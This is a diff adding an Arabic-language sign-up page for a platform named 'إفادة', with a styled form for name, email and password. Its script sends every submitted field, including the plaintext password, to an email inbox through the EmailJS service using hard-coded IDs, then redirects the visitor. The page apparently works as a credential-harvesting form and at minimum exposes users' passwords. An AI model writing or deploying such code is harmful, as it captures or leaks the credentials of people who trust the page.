@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التسجيل في منصة إفادة</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        :root {
+            --primary-bg: #1a1a2e;
+            --secondary-bg: #16213e;
+            --accent-color: #64ffda;
+            --text-primary: #ffffff;
+            --text-secondary: #eeeeee;
+            --input-bg: rgba(100, 255, 218, 0.1);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--primary-bg), var(--secondary-bg));
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        /* شعار المنصة الجديد */
+        .platform-logo {
+            position: absolute;
+            top: 20px;
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, var(--accent-color), #00a8cc);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(100, 255, 218, 0.3);
+        }
+
+        .platform-logo img {
+            width: 60%;
+            height: 60%;
+            object-fit: contain;
+            filter: brightness(0) invert(1);
+        }
+
+        .registration-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            border-radius: 20px;
+            padding: 2rem;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+            margin-top: 120px; /* زيادة الهامش لأعلى لاستيعاب الشعار */
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .title {
+            font-size: 2rem;
+            background: linear-gradient(45deg, var(--accent-color), #00a8cc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 0.5rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .input-container {
+            background: var(--input-bg);
+            border-radius: 10px;
+            padding: 1rem;
+            position: relative;
+            transition: var(--transition);
+        }
+
+        .input-container:focus-within {
+            box-shadow: 0 0 15px rgba(100, 255, 218, 0.2);
+        }
+
+        .input-field {
+            width: 100%;
+            background: transparent;
+            border: none;
+            color: var(--text-primary);
+            font-size: 1rem;
+            padding: 0.5rem;
+            outline: none;
+        }
+
+        .input-field::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
+
+        .password-toggle {
+            position: absolute;
+            left: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .submit-btn {
+            background: linear-gradient(45deg, var(--accent-color), #00a8cc);
+            color: var(--text-primary);
+            width: 100%;
+            padding: 1rem;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: var(--transition);
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 1rem;
+        }
+
+        /* زر "لديك حساب" الجديد */
+        .login-link {
+            text-align: center;
+            margin-top: 1rem;
+        }
+
+        .login-link a {
+            color: var(--accent-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            transition: var(--transition);
+        }
+
+        .login-link a:hover {
+            color: #00a8cc;
+            text-shadow: 0 0 10px rgba(100, 255, 218, 0.3);
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--accent-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .validation-message {
+            color: #ff647f;
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+            display: none;
+        }
+        .platform-logo img {
+    filter: none;
+}
+
+    </style>
+</head>
+<body>
+    <!-- شعار المنصة المضاف -->
+    <div class="platform-logo">
+        <img src="3e50cb7e-3077-471a-8749-9864648da119.png" alt="شعار إفادة">
+    </div>
+
+    <div class="registration-card">
+        <div class="card-header">
+            <h1 class="title">إنشاء حساب جديد</h1>
+        </div>
+
+        <form id="registrationForm">
+            <div class="form-group">
+                <div class="input-container">
+                    <input type="text" 
+                           class="input-field" 
+                           id="firstName" 
+                           placeholder="الاسم الأول"
+                           required>
+                </div>
+                <div class="validation-message" id="firstNameError"></div>
+            </div>
+
+            <div class="form-group">
+                <div class="input-container">
+                    <input type="text" 
+                           class="input-field" 
+                           id="lastName" 
+                           placeholder="اسم العائلة"
+                           required>
+                </div>
+                <div class="validation-message" id="lastNameError"></div>
+            </div>
+
+            <div class="form-group">
+                <div class="input-container">
+                    <input type="email" 
+                           class="input-field" 
+                           id="email" 
+                           placeholder="البريد الإلكتروني"
+                           required>
+                </div>
+                <div class="validation-message" id="emailError"></div>
+            </div>
+
+            <div class="form-group">
+                <div class="input-container">
+                    <input type="password" 
+                           class="input-field" 
+                           id="password" 
+                           placeholder="كلمة المرور"
+                           required>
+                    <i class="fas fa-eye password-toggle" onclick="togglePasswordVisibility()"></i>
+                </div>
+                <div class="validation-message" id="passwordError"></div>
+            </div>
+
+
+            <button type="submit" class="submit-btn" id="submitBtn">
+                إنشاء حساب
+            </button>
+
+            <!-- زر "لديك حساب" المضاف -->
+            <div class="login-link">
+                <a href="index.html">
+                    <i class="fas fa-sign-in-alt"></i>
+                    لديك حساب؟ سجل الدخول الآن
+                </a>
+            </div>
+        </form>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <script>
+        // تهيئة EmailJS
+        emailjs.init('nf2gRwNiQobOFrImW'); // استبدل بالمفتاح العام الخاص بك
+
+        // تبديل رؤية كلمة المرور
+        function togglePasswordVisibility() {
+            const passwordField = document.getElementById('password');
+            const icon = document.querySelector('.password-toggle');
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                icon.classList.replace('fa-eye', 'fa-eye-slash');
+            } else {
+                passwordField.type = 'password';
+                icon.classList.replace('fa-eye-slash', 'fa-eye');
+            }
+        }
+
+        // التحقق من صحة النموذج
+        function validateForm() {
+            let isValid = true;
+            const fields = {
+                firstName: document.getElementById('firstName'),
+                lastName: document.getElementById('lastName'),
+                email: document.getElementById('email'),
+                password: document.getElementById('password')
+            };
+
+            // إعادة تعيين رسائل الخطأ
+            document.querySelectorAll('.validation-message').forEach(el => {
+                el.style.display = 'none';
+            });
+
+            // التحقق من الاسم الأول
+            if (fields.firstName.value.trim().length < 2) {
+                document.getElementById('firstNameError').textContent = 'الاسم يجب أن يحتوي على الأقل على حرفين';
+                document.getElementById('firstNameError').style.display = 'block';
+                isValid = false;
+            }
+
+            // التحقق من اسم العائلة
+            if (fields.lastName.value.trim().length < 2) {
+                document.getElementById('lastNameError').textContent = 'اسم العائلة يجب أن يحتوي على الأقل على حرفين';
+                document.getElementById('lastNameError').style.display = 'block';
+                isValid = false;
+            }
+
+            // التحقق من البريد الإلكتروني
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(fields.email.value)) {
+                document.getElementById('emailError').textContent = 'البريد الإلكتروني غير صحيح';
+                document.getElementById('emailError').style.display = 'block';
+                isValid = false;
+            }
+
+            // التحقق من كلمة المرور
+            if (fields.password.value.length < 8) {
+                document.getElementById('passwordError').textContent = 'كلمة المرور يجب أن تكون 8 أحرف على الأقل';
+                document.getElementById('passwordError').style.display = 'block';
+                isValid = false;
+            }
+
+            return isValid;
+        }
+
+        // إرسال النموذج
+        document.getElementById('registrationForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            if (!validateForm()) return;
+
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+
+            try {
+                submitBtn.disabled = true;
+                submitBtn.classList.add('loading');
+                loadingOverlay.style.display = 'flex';
+
+                const formData = {
+                    firstName: document.getElementById('firstName').value,
+                    lastName: document.getElementById('lastName').value,
+                    email: document.getElementById('email').value,
+                    password: document.getElementById('password').value
+                };
+
+                // إرسال البيانات عبر EmailJS
+                await emailjs.send('service_r7ujzzg', 'template_vhxyi1b', formData);
+
+                // توجيه إلى صفحة start.html بعد 2 ثانية
+                setTimeout(() => {
+                    window.location.href = 'start.html';
+                }, 2000);
+
+            } catch (error) {
+                console.error('Error:', error);
+                alert('حدث خطأ أثناء التسجيل، يرجى المحاولة مرة أخرى');
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.classList.remove('loading');
+                loadingOverlay.style.display = 'none';
+            }
+        });
+         // تحقق إذا كانت هذه أول زيارة (مثلاً لا يوجد session)
+    if (!sessionStorage.getItem('visited')) {
+        sessionStorage.setItem('visited', 'true');
+        window.location.href = 'index.html'; // أو الصفحة الرئيسية التي تريدها
+    }
+
+    </script>
+</body>
+</html>
